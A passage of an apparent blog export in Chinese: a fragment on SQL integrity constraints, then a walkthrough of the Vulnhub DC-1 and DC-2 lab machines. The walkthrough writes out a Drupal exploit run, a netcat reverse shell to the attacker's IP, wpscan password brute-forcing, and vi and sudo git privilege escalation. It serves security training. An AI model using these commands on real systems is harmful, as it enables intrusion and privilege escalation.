id=\"参照完整性\"><a href=\"#参照完整性\" class=\"headerlink\" title=\"参照完整性\"></a>参照完整性</h3><p>关系模型的参照完整性在 <code>CREATE TABLE</code> 中用 <code>FOREIGN KEY</code> 短语定义哪些列为外码，用 <code>PERFERENCES</code> 短语指明这些外码参照哪些表的主码。</p>\n<h4 id=\"参照完整性检查和违约处理\"><a href=\"#参照完整性检查和违约处理\" class=\"headerlink\" title=\"参照完整性检查和违约处理\"></a>参照完整性检查和违约处理</h4><p>参照完整性将两个表中的相应元组联系起来了。因此，对被参照表和参照表进行增删改操作可能破坏参照完整性，必须检查两个表的相容性。</p>\n<p>当相容性发生不一致时，系统可以采用一下策略加以处理：</p>\n<ul>\n<li>拒绝执行- <code>NO ACTION</code> ：默认操作</li>\n<li>级联操作- <code>CASCADE</code> : 当删除或修改被参照表的一个元组导致与参照表的不一致时，删除或修改参照表中的所有导致不一致的元组。</li>\n<li>设置为空值 ：当删除或修改被参照表的一个元组时造成了不一致，则将参照表中的所有造成不一致的元组的对应属性设置为空值。</li>\n</ul>\n<p>对于参照完整性，除了应该定义外码，还应定义外码是否允许空值。</p>\n<h3 id=\"用户定义的完整性\"><a href=\"#用户定义的完整性\" class=\"headerlink\" title=\"用户定义的完整性\"></a>用户定义的完整性</h3><p>针对某一具体应用的数据必须满足的语义条件。</p>\n<h4 id=\"属性上的约束条件\"><a href=\"#属性上的约束条件\" class=\"headerlink\" title=\"属性上的约束条件\"></a>属性上的约束条件</h4><ul>\n<li><code>NOT NULL</code> 列值非空</li>\n<li><code>UNIQUE</code> 列值唯一</li>\n<li><code>CHECK</code> 检查列值是否满足一个条件表达式</li>\n</ul>\n<p>插入元组或修改属性的值时，关系数据库管理系统将检查属性上的约束条件是否被满足，不满足则操作被拒绝执行。</p>\n<h4 id=\"元组上的约束条件\"><a href=\"#元组上的约束条件\" class=\"headerlink\" title=\"元组上的约束条件\"></a>元组上的约束条件</h4><p>在 <code>CREATE TABLE</code> 中可以用<code>CHECK</code> 短句定义元组上的约束条件，即元组级的限制。元组级的限制可以设置不同属性之间的取值的相互约束条件。</p>\n<p>插入元组或修改属性的值时，关系数据库管理系统将检查元组上的约束条件是否被满足，不满足则操作被拒绝执行。</p>\n","text":"数据库概论E-R图增删改查创建新表并插入数据1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>mysql&gt; show tables;<br>+-----------------------+<br>| Tables_in_studentinfo","link":"","raw":null,"photos":[],"categories":[{"name":"SQL","slug":"SQL","count":1,"path":"api/categories/SQL.json"}],"tags":[{"name":"MySql","slug":"MySql","count":2,"path":"api/tags/MySql.json"}]},{"title":"Vulnhub","slug":"Vulnhub渗透测试","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:48:43.165Z","comments":true,"path":"api/articles/Vulnhub渗透测试.json","excerpt":"","keywords":null,"cover":"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczksqx4o2j30yn0dfwhj.jpg","content":"<h1 id=\"DC-1-渗透测试\"><a href=\"#DC-1-渗透测试\" class=\"headerlink\" title=\"DC-1 渗透测试\"></a>DC-1 渗透测试</h1><h2 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h2><p>官网下载压缩包后解压出 .ova 文件，然后用 Vmware 打开即可。</p>\n<h2 id=\"能学到什么？\"><a href=\"#能学到什么？\" class=\"headerlink\" title=\"能学到什么？\"></a>能学到什么？</h2><ul>\n<li>arp-scan 进行主机发现</li>\n<li>nmap 扫描主机端口开放和运行的服务情况</li>\n<li>whatweb 指纹识别</li>\n<li>searchsploit 离线漏洞库使用</li>\n<li>nc 反弹shell</li>\n<li>SUID 提权</li>\n</ul>\n<h2 id=\"Let’s-do-it\"><a href=\"#Let’s-do-it\" class=\"headerlink\" title=\"Let’s do it!\"></a>Let’s do it!</h2><p>先扫描一下靶机 IP </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">srp-scan -l</span><br><span class=\"line\">nmap -p- -A 192.168.0.119</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczksqx4o2j30yn0dfwhj.jpg\" alt=\"主机扫描\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczksxvr1ij30ji0h37bw.jpg\" alt=\"端口扫描结果\"></p>\n<p>看到 robots.txt 的一些信息。访问之后暂时没有找到靶机的敏感信息。还是先看一下靶机使用的 CMS 版本，找找有没有可利用的漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whatweb http://192.168.0.119</span><br><span class=\"line\">searchsploit drupal 7</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkt4dx55j30k50hztj8.jpg\" alt=\"版本探测\"></p>\n<p>看到一个通过注入添加账户，我们就用这个：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python /usr/share/exploitdb/exploits/php/webapps/34992.py -u root -p root -t http://192.168.0.119</span><br></pre></td></tr></table></figure>\n\n<p>登陆成功之后我们顺利拿到了 flag3。<strong>PERMS</strong> ? <strong>FIND</strong>?  先找找 flag1 &amp; flag2 吧。</p>\n<p>看了看后台其他地方，没有看到flag的影子，但是找到了一个module上传的地方。同时在上传上方提供的链接那里找到了一个特殊的 module：shell.我们下载下来并上传。</p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkv7iltzj30yh0fwwjq.jpg\" alt=\"flag3\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkvhebatj30nc0fb0tp.jpg\" alt=\"module上传\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkw4vwawj30x40hy77k.jpg\" alt=\"module-shell\"></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczkwagg0oj30lt08et8w.jpg\" alt=\"上传shell成功\"></p>\n<p>上传成功之后别忘记在配置 Modules 页面勾选 我们刚上传的 shell ，并且保存配置。接下来，在主页就可以使用这个特殊的 shell 。</p>\n<p>我们先试试 <code>find</code> 命令吧。得到 flag1 并提示我们查看配置文件。先 nc 反弹个 shell 吧。 然后在默认的文件路径下找到配置文件，同时获取了 flag2 和数据库账号密码！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczkwgbjzxj30qp0dogm5.jpg\" alt=\"使用shell\"></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczkwl1s70j30i2066ta7.jpg\" alt=\"反弹shell\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkwos8m3j30l00f7n2z.jpg\" alt=\"flag2\"></p>\n<p>现在，我们拿到了数据库账号密码，flag2的提示”爆破和字典攻击不是唯一的获得访问权的方式”，这明显是提醒如何获取flag3的。</p>\n<p>既然我们已经通过其他方式得到了 flag3 ，就先把数据库放一边，再看看flag3 的提示：</p>\n<p><strong>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</strong></p>\n<p>这里我再次使用了find 命令想找找有没有其他的发现，结果 flag4 &amp; thefinalflag 都出现了。与上次的区别在于我这次找的是 <code>flag*</code> 。尝试读取最后的 flag 时发现权限不够。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / | grep flag*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczky5tjj3j30jv0con4q.jpg\" alt=\"flag4\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkyb2j3gj30ki0hd0y5.jpg\" alt=\"读取finalflag失败\"></p>\n<p><code>Google</code> 了一下 <code>find perm escalate privileges</code> ,找到一篇<a href=\"https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/\" target=\"_blank\" rel=\"noopener\">大牛文章</a>，按照文章的方法成功提权，并且读取最后一个 flag ！</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczkygi4h1j30t10dj40o.jpg\" alt=\"find-suid\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkyn8eu5j30h80dmwht.jpg\" alt=\"root权限执行命令\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkysuue9j30jr07jwgw.jpg\" alt=\"最后一个flag\"></p>\n<h1 id=\"DC-2-渗透测试\"><a href=\"#DC-2-渗透测试\" class=\"headerlink\" title=\"DC-2 渗透测试\"></a>DC-2 渗透测试</h1><h2 id=\"Info-of-DC-2\"><a href=\"#Info-of-DC-2\" class=\"headerlink\" title=\"Info of DC-2\"></a>Info of <a href=\"https://www.vulnhub.com/entry/dc-2,311/#\" target=\"_blank\" rel=\"noopener\">DC-2</a></h2><h3 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h3><blockquote>\n<p>Just like with DC-1, there are five flags including the final flag.</p>\n<p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p>\n<p>In short, the only flag that really counts, is the final flag.</p>\n<p>For beginners, <strong>Google is your friend. Well, apart from all the privacy concerns etc etc.</strong></p>\n<p>Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.</p>\n<p><strong>Please note that you will need to set the hosts file on your pentesting device to something like:</strong></p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.131</span> dc<span class=\"number\">-2</span></span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>Obviously, replace 192.168.0.145 with the actual IP address of DC-2.</p>\n</blockquote>\n<h2 id=\"能学到什么？-1\"><a href=\"#能学到什么？-1\" class=\"headerlink\" title=\"能学到什么？\"></a>能学到什么？</h2><ul>\n<li>如何利用 Nmap 进行主机发现并扫描目标主机端口服务开放情况</li>\n<li>CeWl 是什么？怎么用？</li>\n<li>如何利用 WPscan 枚举 WP站点用户</li>\n<li>如何利用 WPscan 爆破后台账号密码</li>\n<li>vi 提权</li>\n<li>Git 提权</li>\n</ul>\n<h2 id=\"Let’s-do-it-1\"><a href=\"#Let’s-do-it-1\" class=\"headerlink\" title=\"Let’s do it!\"></a>Let’s do it!</h2><p>先使用进行 nmap 进行主机发现</p>\n<p><code>nmap -sn 192.168.0.0/24</code></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl41xnwvj30j408jgq3.jpg\" alt=\"扫描结果\"></p>\n<p>去浏览器搜索发现 <code>192.168.0.131</code> 正是靶机(上文简介中作者提到如果访问靶机不成功记得修改 hosts 文件，将靶机 IP 添加进去)。</p>\n<p>接下来我们简单扫一下端口，我们扫了1000个端口，可以看到开放80，同时也能发现是 wordpress 的站点。</p>\n<p><code>nmap -A 192.168.0.131</code> </p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl4abh1kj31420iyaqv.jpg\" alt=\"靶机端口信息\"> </p>\n<p>接下来，我们浏览目标站点，发现了 flag 内容</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4fhr7aj30sr0gp7a1.jpg\" alt=\"Flag 内容\"></p>\n<p>这是第一个 flag ！提示我们可能要用到 cewl 来制作一个字典 进行登陆。</p>\n<blockquote>\n<p>Cewl - Custom Word List generator</p>\n<p>Based on a discussion on <a href=\"http://wiki.securityweekly.com/wiki/index.php/Episode129\" target=\"_blank\" rel=\"noopener\">PaulDotCom episode 129</a> about creating custom word lists by spidering a targets website and  collecting unique words I decided to write CeWL, the Custom Word List  generator. CeWL is a ruby app which spiders a given url to a specified  depth, optionally following external links, and returns a list of words  which can then be used for password crackers such as <a href=\"http://www.openwall.com/john/\" target=\"_blank\" rel=\"noopener\">John the Ripper</a>.     </p>\n<p>可以大致了解到 cewl 是通过爬虫的方式对目标网站进行深度爬取，然后返回可能作为密码的词汇</p>\n</blockquote>\n<p>我们来制作一个密码本吧！</p>\n<p><code>cewl -w dc-2pwd.txt http://dc-2</code></p>\n<p>然后使用 wpscan 来枚举一下用户</p>\n<p> <code>wpscan -e u --url 192.168.0.131</code></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4kx0ogj30v60g4ahu.jpg\" alt=\"用户名\"></p>\n<p>除了 <strong>admin</strong> 外，还有 <strong>jerry</strong> 和 <strong>tom</strong> . 我们把用户名保存在 <strong>dc-2user.txt</strong> 中。</p>\n<p>然后来爆破密码</p>\n<p><code>wpscan -P dc-2pwd.txt -U dc-2user.txt --url http://dc-2</code></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4r2fj2j30vm0akaf5.jpg\" alt=\"爆破密码\"></p>\n<p>得到两组可用的账号密码:</p>\n<p><strong>jerry / adipiscing</strong></p>\n<p><strong>tom / parturient</strong></p>\n<p>我们去后台(<a href=\"http://dc-2/wp-admin)登陆进去看到了Flag2。\" target=\"_blank\" rel=\"noopener\">http://dc-2/wp-admin)登陆进去看到了Flag2。</a></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl54khqaj30su0fwq4r.jpg\" alt=\"后台\"></p>\n<p>其他的入口？我们再对靶机进行一次全端口扫描</p>\n<p><code>nmap -p- -A 192.168.0.131</code></p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl58dlv3j30pq0fmgrb.jpg\" alt=\"端口扫描\"></p>\n<p>尝试登陆一下 ssh ，用 tom 的账号密码登陆上后发现我们得到的是 restricted shell. 同时我们只有四个命令可以使用。分别是</p>\n<p> <code>less 、ls、scp、vi.</code></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl5cpiyfj30ns0cvq6w.jpg\" alt=\"rbash\"></p>\n<p>我们可以在<a href=\"https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/\" target=\"_blank\" rel=\"noopener\">这里</a>找到一些提权总结。里面提到了使用 <code>vi</code> 提权。</p>\n<p><code>vi flag3.txt</code> 查看一下文本内容</p>\n<blockquote>\n<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>\n</blockquote>\n<p>我们需要切换到 jerry 才能继续，我们就利用上文提权总结里的方法利用 <strong>vi</strong> 进行提权：<code>vi</code> 进入交互模式之后直接输入：</p>\n<p><code>!set shell=/bin/sh</code></p>\n<p><code>!shell</code></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczl5gjui5j30bo0dj0to.jpg\" alt=\"提权到jerry\"></p>\n<p>虽然提权切换到 jerry 了，但是看起来还是个 restricted shell.</p>\n<p>我们查看环境变量发现不对劲，修改一下环境变量之后我们就可以执行命令了。也在 flag4 中发现提示我们 git 提权。 </p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl5msm3jj30f00h440l.jpg\" alt=\"PATH\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl61u3wzj30jn083dgw.jpg\" alt=\"flag4.txt\"></p>\n<p>还差最后一步！</p>\n<p>还好，我们百度到一篇<a href=\"https://www.agesec.com/4144.html\" target=\"_blank\" rel=\"noopener\">GIt提权文章</a>，查看权限发现可以不用密码就可以以 <strong>root</strong> 身份执行 <strong>git</strong> 命令，同时利用调用命令交互窗口</p>\n<p><code>sudo git help config</code></p>\n<p><code>!/bin/sh</code>   </p>\n<p>即可顺利提权！</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl6aztnwj30hk067got.jpg\" alt=\"nopasswd-git\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl6gqm7vj30i20dyafx.jpg\" alt=\"finally!\"></p>\n<h2 id=\"Little-tips\"><a href=\"#Little-tips\" class=\"headerlink\" title=\"Little tips\"></a>Little tips</h2><p>在使用 WPscan 之前你可能需要升级到最新版本。因为从 2/1/2020 起，WPscan 将放弃维护之前的版本.</p>\n<blockquote>\n<p>We released WPScan 3.7.0 on <a href=\"https://twitter.com/_WPScan_/status/1172432920159539202\" target=\"_blank\" rel=\"noopener\">September 13th 2019</a>, which uses the <a href=\"https://wpvulndb.com/api\" target=\"_blank\" rel=\"noopener\">WPVulnDB API</a> to fetch vulnerability data in real time. On February 1st 2020, we will be deprecating the use of older versions of WPScan, prior to version  3.7.0.</p>\n<p>Anyone using WPScan that is at a version lesser than 3.7.0 will have  to update to at least version 3.7.0, or above, before February 1st 2020.</p>\n</blockquote>\n<p>还有一点需要注意的是升级之后如果想使用他们的漏洞库，必须要到官网进行注册，获得TOKEN。在使用时带上 TOKEN 才能正常使用。</p>\n","text":"DC-1 渗透测试环境准备官网下载压缩包后解压出 .ova 文件，然后用 Vmware 打开即可。能学到什么？arp-scan 进行主机发现nmap 扫描主机端口开放和运行的服务情况whatweb 指纹识别searchsploit 离线漏洞库使用nc 反弹shellSUID 提权","link":"","raw":null,"photos":[],"categories":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/categories/penetration-test.json"}],"tags":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/tags/penetration-test.json"}]}]}